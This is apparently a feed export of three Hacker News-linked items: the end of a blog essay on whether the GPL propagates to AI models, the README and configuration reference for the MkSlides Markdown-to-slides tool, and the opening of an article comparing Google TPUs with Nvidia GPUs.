    &lt;p&gt;However, the FSF simultaneously states to the effect that “whether a non-free machine learning application is ethically unjust depends on the case,” mentioning that there can be “legitimate moral reasons” for not being able to publish training data (personal information) of a medical diagnosis AI, for example. In that case, it implies that although that AI is non-free, its use might be ethically permitted due to social utility. One can see an attitude of seeking a compromise between the FSF’s ideal and reality here, but in any case, there is no mistake that the FSF ultimately aims for freedom including training data.&lt;/p&gt;
    &lt;p&gt;So, does the FSF support the theory of GPL propagation to AI models? Not necessarily. Their claim is closer to an ethical standard or ideal image rather than legal enforceability, and they are not arguing that it applies to models as an interpretation of the current GPL license. Rather, as mentioned before, they are at the stage of trying to create new standards and agreements. Even in the white paper on the Copilot issue funded by the FSF, while legal points such as copyright and license violation are discussed, substantially it has a strong aspect of being told as a GPL compliance problem for users (downstream developers) concerned that they bear the risk of GPL violation if Copilot’s output contains GPL code fragments. This is a caution to developers using AI coding tools rather than GPL application to the model itself, and is different from an approach forcing GPL compliance directly on model providers.&lt;/p&gt;
    &lt;p&gt;The Software Freedom Conservancy (SFC) naturally has a strong interest in this issue but is also cautious in some respects. The SFC started the protest campaign “Give Up GitHub” against GitHub in 2022, condemning Copilot’s methods as contrary to the philosophy of open source, and is also involved in the Copilot class action. However, in an SFC blog post, regarding this lawsuit, it showed concern about “the risk of interpretations deviating from the principles of the open source community being brought in,” and called on the plaintiffs’ side to comply with community-led GPL enforcement principles as well. The SFC also states that Copilot’s act is an “unprecedented license violation,” and while not fully denying the GPL propagation theory, it can be interpreted as fearing that a judicial precedent undesirable for the community might be created depending on the result of the legal battle. The SFC might be said to be carefully balancing between the aspect of pursuing GPL propagation and the risk of entrusting it to the judiciary.&lt;/p&gt;
    &lt;p&gt;Finally, what is concerned as the free software camp is that excessive propagation of licenses might conversely invite results that impair freedom. Both OSI and FSF ultimately want to make AI something open that anyone can utilize, but they are carefully assessing whether increasing the purity of legal theory in demands for full data disclosure really leads to achieving the objective. Considering the demerits such as the avoidance of open data due to excessive propagation interpretation or the atrophy effect due to a flurry of lawsuits, I feel that the major organizations share a commonality in that it is essential not to lose sight of the big picture of spreading freedom. Rather than inciting GPL application to models, the pursuit of realistic solutions such as how to make models and data open and which parts should be relaxed in line with reality will likely continue in the future.&lt;/p&gt;
    &lt;head rend="h2"&gt;Summary&lt;/head&gt;
    &lt;p&gt;I have looked at the current state of the theory of GPL propagation to AI models above, and as a conclusion, this theory is in a halfway position where “it is not touted as loudly as before, but it has not completely disappeared.” As a result of points such as license violation of training data and reproduction within the model beginning to be scrutinized in lawsuits like the Copilot class action and GEMA v. OpenAI, it even appears that the hurdle for infringement certification is lowering. In fact, the Munich District Court’s judgment deemed model memory as reproduction, and the claim of open source license violation survives in the Copilot litigation.&lt;/p&gt;
    &lt;p&gt;However, on the other hand, the hurdle for the propagation of licenses like GPL remains high. There is a large gap between infringement being recognized and the conclusion that the entire model must be disclosed under GPL etc. immediately. What the current lawsuits are seeking is also injunctions and damages, not the forced GPL-ization of the model. There are zero examples where the judiciary supported the theory of GPL propagation to models itself, and it is a legally uncharted territory. Even if that claim were attempted somewhere in the future, it would face the legal, technical, and practical counterarguments mentioned earlier.&lt;/p&gt;
    &lt;p&gt;However, the situation has fluid parts, and there is a possibility that the line will shift depending on the policies of each country and the trends of the community. For example, if pressure from rights holder groups strengthens in Europe, there is a possibility that guidelines including license compliance will be formulated. Also, if a consensus is formed within the community regarding the state of copyleft in the AI era, a new license might appear. If such changes occur, a phase where the theory of propagation to models is re-evaluated will also arrive.&lt;/p&gt;
    &lt;p&gt;To offer my personal opinion, what is important at this moment is the perspective of how to balance software freedom and freedom in the AI domain. Instead of blindly trying to apply the philosophy of copyleft to AI, it is necessary to think about what is best to maximize freedom while considering the technical nature and industrial structure peculiar to AI. Fortunately, solutions to practical problems such as the open publication of large-scale AI models, dataset cleaning methods, and automated attachment of license notices are already being explored by the open source community. Promoting such voluntary efforts and supporting them with legal frameworks as necessary will likely be the key to balancing freedom and development.&lt;/p&gt;
    &lt;p&gt;The theory of GPL propagation to models is a point where judgment is divided on whether it is an ideal to be pursued or a nightmare to be avoided. However, as stated in this article, seeing the situation in the current year of 2025, it is not a situation where it will become reality immediately, and the majority of the community is likely maintaining a cautious stance. Although it is speculated that trial and error will continue in the judicial, legislative, and technical aspects in the future, as our community, we need to continue exploring the point of compatibility between technological innovation and software freedom without jumping to hasty conclusions. That process itself can be said to be a new challenge in the AI era on the extension of the free software spirit.&lt;/p&gt;
    &lt;head rend="h2"&gt;References&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;GitHub Copilot litigation: https://githubcopilotlitigation.com/&lt;/item&gt;
      &lt;item&gt;GEMA v. OpenAI Judgment text: https://aifray.com/wp-content/uploads/2025/11/42-O-14139-24-Endurteil.pdf&lt;/item&gt;
      &lt;item&gt;GEMA vs. OpenAI | AI memorisation is a reproduction relevant to copyright law, and the TDM exception does not help in LLM training, Munich I Regional Court holds: https://www.osborneclarke.com/insights/gema-vs-openai-ai-memorisation-reproduction-relevant-copyright-law-and-tdm-exception-does&lt;/item&gt;
      &lt;item&gt;Impressions on GEMA v. OpenAI (Munich I Regional Court) Judgment: https://shujisado.com/2025/11/15/gema-v-openai/&lt;/item&gt;
      &lt;item&gt;Draft thought on AI and Copyright, Agency for Cultural Affairs: https://www.bunka.go.jp/seisaku/bunkashingikai/chosakuken/pdf/94037901_01.pdf&lt;/item&gt;
      &lt;item&gt;Contract Guidelines on Utilization of AI and Data: https://www.meti.go.jp/policy/mono_info_service/connected_industries/sharing_and_utilization/20180615001-1.pdf&lt;/item&gt;
      &lt;item&gt;Open Source AI: https://opensource.org/ai&lt;/item&gt;
      &lt;item&gt;Is publication of complete training data necessary for AI models to be Open Source?: https://shujisado.com/2025/02/18/need_for_training_data_in_opensource_ai/&lt;/item&gt;
      &lt;item&gt;Controlling technology at the age of Artificial Intelligence: a Free Software perspective: https://fsfe.org/freesoftware/artificial-intelligence.en.html&lt;/item&gt;
      &lt;item&gt;FSF is working on freedom in machine learning applications: https://www.fsf.org/news/fsf-is-working-on-freedom-in-machine-learning-applications&lt;/item&gt;
      &lt;item&gt;Give Up GitHub!: https://sfconservancy.org/GiveUpGitHub/&lt;/item&gt;
      &lt;item&gt;On the filing of the Class Action Law Suit over GitHub’s Copilot: https://sfconservancy.org/news/2022/nov/04/class-action-lawsuit-filing-copilot/&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://shujisado.org/2025/11/27/gpl-propagates-to-ai-models-trained-on-gpl-code/"/><published>2025-11-27T12:48:12+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46068847</id><title>Show HN: MkSlides – Markdown to slides with a similar workflow to MkDocs</title><updated>2025-11-27T22:10:01.256257+00:00</updated><content>&lt;doc fingerprint="6204be3b1ea793b4"&gt;
  &lt;main&gt;
    &lt;quote&gt;&lt;p&gt;Use&lt;/p&gt;&lt;code&gt;mkslides&lt;/code&gt;to easily turn Markdown files into beautiful slides using the power of Reveal.js!&lt;/quote&gt;
    &lt;p&gt;MkSlides is a static site generator that's geared towards building slideshows. Slideshow source files are written in Markdown, and configured with a single YAML configuration file. The workflow and commands are heavily inspired by MkDocs and reveal-md.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Build static HTML slideshow files from Markdown files. &lt;list rend="ul"&gt;&lt;item&gt;Turn a single Markdown file into a HTML slideshow.&lt;/item&gt;&lt;item&gt;Turn a folder with Markdown files into a collection of HTML slideshows with an index landing page.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Publish your slideshow(s) anywhere that static files can be served. &lt;list rend="ul"&gt;&lt;item&gt;Locally on your own device.&lt;/item&gt;&lt;item&gt;On a web server.&lt;/item&gt;&lt;item&gt;Deploy through CI/CD with GitHub/GitLab (like this repo!).&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Preview your site as you work, thanks to python-livereload.&lt;/item&gt;
      &lt;item&gt;Use custom favicons, CSS themes, templates, ... if desired.&lt;/item&gt;
      &lt;item&gt;Support for emojis 😄 🎉 🚀 ✨ thanks to emoji&lt;/item&gt;
      &lt;item&gt;Depends heavily on integration/unit tests to prevent regressions.&lt;/item&gt;
      &lt;item&gt;And more!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example slide from https://martenbe.github.io/mkslides with dracula theme:&lt;/p&gt;
    &lt;p&gt;Example index page from https://hogenttin.github.io/hogent-markdown-slides with HOGENT theme, custom title, and custom background logo:&lt;/p&gt;
    &lt;p&gt;Example output when building the website:&lt;/p&gt;
    &lt;p&gt;Example output when using live preview during editing:&lt;/p&gt;
    &lt;p&gt;Want more examples? An example repo with slides demonstrating all possibilities (Mermaid.js and PlantUML support, multicolumn slides, image resizing, ...) using Reveal.js with the HOGENT theme can be found at https://github.com/HoGentTIN/hogent-markdown-slides .&lt;/p&gt;
    &lt;code&gt;pip install mkslides&lt;/code&gt;
    &lt;p&gt;E.g. when your Markdown files are located in the &lt;code&gt;slides/&lt;/code&gt; folder:&lt;/p&gt;
    &lt;code&gt;mkslides build&lt;/code&gt;
    &lt;p&gt;If the &lt;code&gt;slides&lt;/code&gt; folder doesn't exists, it will fallback to &lt;code&gt;docs&lt;/code&gt; for backwards compatibility. If &lt;code&gt;docs&lt;/code&gt; also doesn't exists, it will error.&lt;/p&gt;
    &lt;p&gt;E.g. when your Markdown files are located in the &lt;code&gt;somefolder/&lt;/code&gt; folder:&lt;/p&gt;
    &lt;code&gt;mkslides build somefolder/&lt;/code&gt;
    &lt;p&gt;E.g. when you have a single Markdown file called &lt;code&gt;test.md&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;mkslides build test.md&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;PATH&lt;/code&gt;, only default static assets will be copied to the output folder. If you want to include images or other files, create a folder instead and pass that as &lt;code&gt;PATH&lt;/code&gt;. Using a file as &lt;code&gt;PATH&lt;/code&gt; is more meant for a quick slideshow in a pinch using only text.&lt;/p&gt;
    &lt;p&gt;The commands for live preview are very similar to creating a static website.&lt;/p&gt;
    &lt;code&gt;mkslides serve
mkslides serve somefolder/
mkslides serve test.md&lt;/code&gt;
    &lt;code&gt;mkslides build -h
mkslides serve -h&lt;/code&gt;
    &lt;p&gt;Just create a &lt;code&gt;mkslides.yml&lt;/code&gt;. All options are optional, you only have to add what you want to change to &lt;code&gt;mkslides.yml&lt;/code&gt;.
Relative file paths are considered relative to the directory containing Markdown files (&lt;code&gt;PATH&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;Here's an example showcasing all possible options in the config file:&lt;/p&gt;
    &lt;code&gt;# Configuration for the generated index page
index:
    # Enables or disables the "Documentation built with MkSlides." footer:
    # boolean
    enable_footer: true

    # Favicon of the generated index page: file path or public url to favicon
    # file
    favicon: example-index-favicon.ico

    # Navigation section describing how to structure the slides on the index
    # page. This is similar to the `nav` option from MkDocs: list[any]
    nav:
        - Example: example1.md
        - "Example 2": somewhere/example1.md
        - example3.md
        - somewhere/example4.md
        - "More examples":
              - example5.md
              - "Much more examples":
                    - "Last example": somewhere/much/more/examples/example6.md

    # Title of the generated index page: string
    title: example-title

    # Jinja 2 template to generate index HTML: file path to Jinja2 file
    template: example.jinja

    # Theme of the generated index page: file path or public url to CSS file
    theme: example-index-theme.css

# Configuration for the slides
slides:
    # Charset of the slides: string
    # (see https://revealjs.com/markdown/#external-markdown)
    charset: utf-8

    # Favicon of the slides: file path or public url to favicon file
    favicon: example-slides-favicon.ico

    # Theme for syntax highlighting of code fragments on the slides: file path
    # to CSS file, public url to CSS file, or one of the highlight.js built-in
    # themes such as `monokai`, `obsidian`, `tokyo-night-dark`, `vs`, ...
    # (see https://highlightjs.org/examples)
    highlight_theme: example-slides-highlight-theme.css

    # Relative path to a python script containing a function
    # Callable[[str], str] named `preprocess`. Important: a relative file path
    # here is considered relative to the configuration file, as you probably
    # don't want to serve the python scripts.
    # For each Markdown file, the whole file content is given to the function as
    # a str. The returned string is then further processed as the Markdown to
    # give to Reveal.js
    preprocess_script: tests/test_preprocessors/replace_ats.py

    # Separator to determine notes of the slide: regexp
    # (see https://revealjs.com/markdown/#external-markdown)
    separator_notes: "^Notes?:"

    # Separator to determine end current/begin new vertical slide: regexp
    # (see https://revealjs.com/markdown/#external-markdown)
    separator_vertical: ^\s*-v-\s*$

    # Separator to determine end current/begin new slide: regexp
    # (see https://revealjs.com/markdown/#external-markdown)
    separator: ^\s*---\s*$

    # Jinja 2 template to generate index HTML: file path to Jinja2 file
    template: ./example.jinja

    # Theme of the slides: file path to CSS file, public url to CSS file, or one
    # of the reveal.js themes such as `black`, `white`, `league`, `solarized`,
    # `dracula`, ... (see https://revealjs.com/themes/)
    theme: example-slides-theme.css

    # Title of the slides. If this is set for a slide, it will be used for the
    # entry in the generated index HTML: string
    title: example-title

# Options to be passed to reveal.js: options in yaml format, they will be
# translated to JSON automatically (see https://revealjs.com/config/)
revealjs:
    height: 1080
    width: 1920
    transition: fade

    example_plugin:
        example_plugin_option_A: true
        example_plugin_option_B: qwerty

# Plugins or additional CSS/JavaScript files for the slides. These are given as
# a list.
plugins:
    # Name of the plugin (optional, see plugin README): plugin id string
    # (see https://revealjs.com/creating-plugins/#registering-a-plugin)
    - name: RevealExamplePlugin
      # List of CSS files of the plugin (optional, see plugin README):
      # public url to CSS file per entry
      extra_css:
          - https://cdn.jsdelivr.net/npm/reveal.js-example-pluging/example.min.css
      # List of JavaScript files of the plugin (optional, see plugin README):
      # public url to JavaScript file per entry
      extra_javascript:
          - https://cdn.jsdelivr.net/npm/reveal.js-example-pluging/example.min.js
    - name: RevealMermaid
      extra_javascript:
          - https://cdn.jsdelivr.net/npm/reveal.js-mermaid-plugin/plugin/mermaid/mermaid.min.js
    - extra_javascript:
          - https://cdn.jsdelivr.net/npm/reveal-plantuml/dist/reveal-plantuml.min.js&lt;/code&gt;
    &lt;p&gt;Default config (also used if no config file is present):&lt;/p&gt;
    &lt;code&gt;index:
    enable_footer: true
    template: assets/templates/index.html.jinja # Comes with the pip package
    title: Index
slides:
    highlight_theme: monokai
    template: assets/templates/slideshow.html.jinja # Comes with the pip package
    theme: black
revealjs:
    history: true
    slideNumber: c/t&lt;/code&gt;
    &lt;p&gt;It is also possible to override &lt;code&gt;slides&lt;/code&gt;, &lt;code&gt;revealjs&lt;/code&gt;, and &lt;code&gt;plugins&lt;/code&gt; options on a per Markdown file base using it's frontmatter. Here, relative file paths are considered relative to the Markdown file itself.&lt;/p&gt;
    &lt;code&gt;---
slides:
    theme: solarized
    highlight_theme: vs
    separator: &amp;lt;!--s--&amp;gt;
    title: Frontmatter title.
revealjs:
    height: 1080
    width: 1920
    transition: zoom
---

# Slides with frontmatter

&amp;lt;!--s--&amp;gt;

## Lorem ipsum

Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.

&amp;lt;!--s--&amp;gt;&lt;/code&gt;
    &lt;p&gt;Notes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;title&lt;/code&gt;here is a frontmatter-only available option to set the title of this slideshow in the generated index page. This option is not available in&lt;code&gt;mkslides.yml&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;The precedence is frontmatter &amp;gt; &lt;code&gt;mkslides.yml&lt;/code&gt;&amp;gt; defaults.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;Usage: mkslides [OPTIONS] COMMAND [ARGS]...

  MkSlides - Slides with Markdown using the power of Reveal.js.

Options:
  -V, --version  Show the version and exit.
  -v, --verbose  Enable verbose output
  -h, --help     Show this message and exit.

Commands:
  build  Build the MkSlides documentation.
  serve  Run the builtin development server.

&lt;/code&gt;
    &lt;code&gt;Usage: mkslides build [OPTIONS] [PATH]

  Build the MkSlides documentation.

  PATH is the path to the directory containing Markdown files. This argument
  is optional and will default to 'slides', or 'docs' if the first directory
  doesn't exist. If PATH is a single Markdown file or a directory containing a
  single Markdown file, it will always be processed into `index.html`
  regardless the name of the Markdown file.

Options:
  -f, --config-file FILENAME  Provide a specific MkSlides-Reveal config file.
  -d, --site-dir PATH         The directory to output the result of the slides
                              build. All files are removed from the site dir
                              before building.
  -s, --strict                Fail if a relative link cannot be resolved,
                              otherwise just print a warning.
  -h, --help                  Show this message and exit.

&lt;/code&gt;
    &lt;code&gt;Usage: mkslides serve [OPTIONS] [PATH]

  Run the builtin development server.

  PATH is the path to the directory containing Markdown files. This argument
  is optional and will default to 'slides', or 'docs' if the first directory
  doesn't exist. If PATH is a single Markdown file or a directory containing a
  single Markdown file, it will always be processed into `index.html`
  regardless the name of the Markdown file.

Options:
  -f, --config-file FILENAME  Provide a specific MkSlides-Reveal config file.
  -s, --strict                Fail if a relative link cannot be resolved,
                              otherwise just print a warning.
  -a, --dev-addr &amp;lt;IP:PORT&amp;gt;    IP address and port to serve slides locally.
  -o, --open                  Open the website in a Web browser after the
                              initial build finishes.
  -h, --help                  Show this message and exit.

&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/MartenBE/mkslides"/><published>2025-11-27T13:00:17+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46069048</id><title>TPUs vs. GPUs and why Google is positioned to win AI race in the long term</title><updated>2025-11-27T22:10:00.844556+00:00</updated><content>&lt;doc fingerprint="3d3a95c811b6b1f1"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The chip made for the AI inference era – the Google TPU&lt;/head&gt;
    &lt;p&gt;Hey everyone,&lt;/p&gt;
    &lt;p&gt;As I find the topic of Google TPUs extremely important, I am publishing a comprehensive deep dive, not just a technical overview, but also strategic and financial coverage of the Google TPU.&lt;/p&gt;
    &lt;p&gt;Topics covered:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;The history of the TPU and why it all even started?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The difference between a TPU and a GPU?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Performance numbers TPU vs GPU?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Where are the problems for the wider adoption of TPUs&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Google’s TPU is the biggest competitive advantage of its cloud business for the next 10 years&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;How many TPUs does Google produce today, and how big can that get?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Gemini 3 and the aftermath of Gemini 3 on the whole chip industry&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Let’s dive into it.&lt;/p&gt;
    &lt;p&gt;The history of the TPU and why it all even started?&lt;/p&gt;
    &lt;p&gt;The story of the Google Tensor Processing Unit (TPU) begins not with a breakthrough in chip manufacturing, but with a realization about math and logistics. Around 2013, Google’s leadership—specifically Jeff Dean, Jonathan Ross (the CEO of Groq), and the Google Brain team—ran a projection that alarmed them. They calculated that if every Android user utilized Google’s new voice search feature for just three minutes a day, the company would need to double its global data center capacity just to handle the compute load.&lt;/p&gt;
    &lt;p&gt;At the time, Google was relying on standard CPUs and GPUs for these tasks. While powerful, these general-purpose chips were inefficient for the specific heavy lifting required by Deep Learning: massive matrix multiplications. Scaling up with existing hardware would have been a financial and logistical nightmare.&lt;/p&gt;
    &lt;p&gt;This sparked a new project. Google decided to do something rare for a software company: build its own custom silicon. The goal was to create an ASIC (Application-Specific Integrated Circuit) designed for one job only: running TensorFlow neural networks.&lt;/p&gt;
    &lt;p&gt;Key Historical Milestones:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;2013-2014: The project moved really fast as Google both hired a very capable team and, to be honest, had some luck in their first steps. The team went from design concept to deploying silicon in data centers in just 15 months—a very short cycle for hardware engineering.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2015: Before the world knew they existed, TPUs were already powering Google’s most popular products. They were silently accelerating Google Maps navigation, Google Photos, and Google Translate.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2016: Google officially unveiled the TPU at Google I/O 2016.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This urgency to solve the “data center doubling” problem is why the TPU exists. It wasn’t built to sell to gamers or render video; it was built to save Google from its own AI success. With that in mind, Google has been thinking about the »costly« AI inference problems for over a decade now. This is also one of the main reasons why the TPU is so good today compared to other ASIC projects.&lt;/p&gt;
    &lt;p&gt;The difference between a TPU and a GPU?&lt;/p&gt;
    &lt;p&gt;To understand the difference, it helps to look at what each chip was originally built to do. A GPU is a “general-purpose” parallel processor, while a TPU is a “domain-specific” architecture.&lt;/p&gt;
    &lt;p&gt;The GPUs were designed for graphics. They excel at parallel processing (doing many things at once), which is great for AI. However, because they are designed to handle everything from video game textures to scientific simulations, they carry “architectural baggage.” They spend significant energy and chip area on complex tasks like caching, branch prediction, and managing independent threads.&lt;/p&gt;
    &lt;p&gt;A TPU, on the other hand, strips away all that baggage. It has no hardware for rasterization or texture mapping. Instead, it uses a unique architecture called a Systolic Array.&lt;/p&gt;
    &lt;p&gt;The “Systolic Array” is the key differentiator. In a standard CPU or GPU, the chip moves data back and forth between the memory and the computing units for every calculation. This constant shuffling creates a bottleneck (the Von Neumann bottleneck).&lt;/p&gt;
    &lt;p&gt;In a TPU’s systolic array, data flows through the chip like blood through a heart (hence “systolic”).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;It loads data (weights) once.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It passes inputs through a massive grid of multipliers.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The data is passed directly to the next unit in the array without writing back to memory.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What this means, in essence, is that a TPU, because of its systolic array, drastically reduces the number of memory reads and writes required from HBM. As a result, the TPU can spend its cycles computing rather than waiting for data.&lt;/p&gt;
    &lt;p&gt;Google’s new TPU design, also called Ironwood also addressed some of the key areas where a TPU was lacking:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;They enhanced the SparseCore for efficiently handling large embeddings (good for recommendation systems and LLMs)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It increased HBM capacity and bandwidth (up to 192 GB per chip). For a better understanding, Nvidia’s Blackwell B200 has 192GB per chip, while Blackwell Ultra, also known as the B300, has 288 GB per chip.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Improved the Inter-Chip Interconnect (ICI) for linking thousands of chips into massive clusters, also called TPU Pods (needed for AI training as well as some time test compute inference workloads). When it comes to ICI, it is important to note that it is very performant with a Peak Bandwidth of 1.2 TB/s vs Blackwell NVLink 5 at 1.8 TB/s. But Google’s ICI, together with its specialized compiler and software stack, still delivers superior performance on some specific AI tasks.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The key thing to understand is that because the TPU doesn’t need to decode complex instructions or constantly access memory, it can deliver significantly higher Operations Per Joule.&lt;/p&gt;
    &lt;p&gt;For scale-out, Google uses Optical Circuit Switch (OCS) and its 3D torus network, which compete with Nvidia’s InfiniBand and Spectrum-X Ethernet. The main difference is that OCS is extremely cost-effective and power-efficient as it eliminates electrical switches and O-E-O conversions, but because of this, it is not as flexible as the other two. So again, the Google stack is extremely specialized for the task at hand and doesn’t offer the flexibility that GPUs do.&lt;/p&gt;
    &lt;p&gt;Performance numbers TPU vs GPU?&lt;/p&gt;
    &lt;p&gt;As we defined the differences, let’s look at real numbers showing how the TPU performs compared to the GPU. Since Google isn’t revealing these numbers, it is really hard to get details on performance. I studied many articles and alternative data sources, including interviews with industry insiders, and here are some of the key takeaways.&lt;/p&gt;
    &lt;p&gt;The first important thing is that there is very limited information on Google’s newest TPUv7 (Ironwood), as Google introduced it in April 2025 and is just now starting to become available to external clients (internally, it is said that Google has already been using Ironwood since April, possibly even for Gemini 3.0.). And why is this important if we, for example, compare TPUv7 with an older but still widely used version of TPUv5p based on Semianalysis data:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 produces 4,614 TFLOPS(BF16) vs 459 TFLOPS for TPUv5p&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 has 192GB of memory capacity vs TPUv5p 96GB&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 memory Bandwidth is 7,370 GB/s vs 2,765 for v5p&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We can see that the performance leaps between v5 and v7 are very significant. To put that in context, most of the comments that we will look at are more focused on TPUv6 or TPUv5 than v7.&lt;/p&gt;
    &lt;p&gt;Based on analyzing a ton of interviews with Former Google employees, customers, and competitors (people from AMD, NVDA &amp;amp; others), the summary of the results is as follows.&lt;/p&gt;
    &lt;p&gt;Most agree that TPUs are more cost-effective compared to Nvidia GPUs, and most agree that the performance per watt for TPUs is better. This view is not applicable across all use cases tho.&lt;/p&gt;
    &lt;p&gt;A Former Google Cloud employee:&lt;/p&gt;
    &lt;p&gt;»If it is the right application, then they can deliver much better performance per dollar compared to GPUs. They also require much lesser energy and produces less heat compared to GPUs. They’re also more energy efficient and have a smaller environmental footprint, which is what makes them a desired outcome.&lt;/p&gt;
    &lt;p&gt;The use cases are slightly limited to a GPU, they’re not as generic, but for a specific application, they can offer as much as 1.4X better performance per dollar, which is pretty significant saving for a customer that might be trying to use GPU versus TPUs.«&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;Similarly, a very insightful comment from a Former Unit Head at Google around TPUs materially lowering AI-search cost per query vs GPUs:&lt;/p&gt;
    &lt;p&gt;»TPU v6 is 60-65% more efficient than GPUs, prior generations 40-45%«&lt;/p&gt;
    &lt;p&gt;This interview was in November 2024, so the expert is probably comparing the v6 TPU with the Nvidia Hopper. Today, we already have Blackwell vs V7.&lt;/p&gt;
    &lt;p&gt;Many experts also mention the speed benefit that TPUs offer, with a Former Google Head saying that TPUs are 5x faster than GPUs for training dynamic models (like search-like workloads).&lt;/p&gt;
    &lt;p&gt;There was also a very eye-opening interview with a client who used both Nvidia GPUs and Google TPUs as he describes the economics in great detail:&lt;/p&gt;
    &lt;p&gt;»If I were to use eight H100s versus using one v5e pod, I would spend a lot less money on one v5e pod. In terms of price point money, performance per dollar, you will get more bang for TPU. If I already have a code, because of Google’s help or because of our own work, if I know it already is going to work on a TPU, then at that point it is beneficial for me to just stick with the TPU usage.&lt;/p&gt;
    &lt;p&gt;In the long run, if I am thinking I need to write a new code base, I need to do a lot more work, then it depends on how long I’m going to train. I would say there is still some, for example, of the workload we have already done on TPUs that in the future because as Google will add newer generation of TPU, they make older ones much cheaper.&lt;lb/&gt;For example, when they came out with v4, I remember the price of v2 came down so low that it was practically free to use compared to any NVIDIA GPUs.&lt;/p&gt;
    &lt;p&gt;Google has got a good promise so they keep supporting older TPUs and they’re making it a lot cheaper. If you don’t really need your model trained right away, if you’re willing to say, “I can wait one week,” even though the training is only three days, then you can reduce your cost 1/5.«&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;Another valuable interview was with a current AMD employee, acknowledging the benefits of ASICs:&lt;/p&gt;
    &lt;p&gt;»I would expect that an AI accelerator could do about probably typically what we see in the industry. I’m using my experience at FPGAs. I could see a 30% reduction in size and maybe a 50% reduction in power vs a GPU.«&lt;/p&gt;
    &lt;p&gt;We also got some numbers from a Former Google employee who worked in the chip segment:&lt;/p&gt;
    &lt;p&gt;»When I look at the published numbers, they (TPUs) are anywhere from 25%-30% better to close to 2x better, depending on the use cases compared to Nvidia. Essentially, there’s a difference between a very custom design built to do one task perfectly versus a more general purpose design.«&lt;/p&gt;
    &lt;p&gt;What is also known is that the real edge of TPUs lies not in the hardware but in the software and in the way Google has optimized its ecosystem for the TPU.&lt;/p&gt;
    &lt;p&gt;A lot of people mention the problem that every Nvidia »competitor« like the TPU faces, which is the fast development of Nvidia and the constant »catching up« to Nvidia problem. This month a former Google Cloud employee addressed that concern head-on as he believes the rate at which TPUs are improving is faster than the rate at Nvidia:&lt;/p&gt;
    &lt;p&gt;»The amount of performance per dollar that a TPU can generate from a new generation versus the old generation is a much significant jump than Nvidia«&lt;/p&gt;
    &lt;p&gt;In addition, the recent data from Google’s presentation at the Hot Chips 2025 event backs that up, as Google stated that the TPUv7 is 100% better in performance per watt than their TPUv6e (Trillium).&lt;/p&gt;
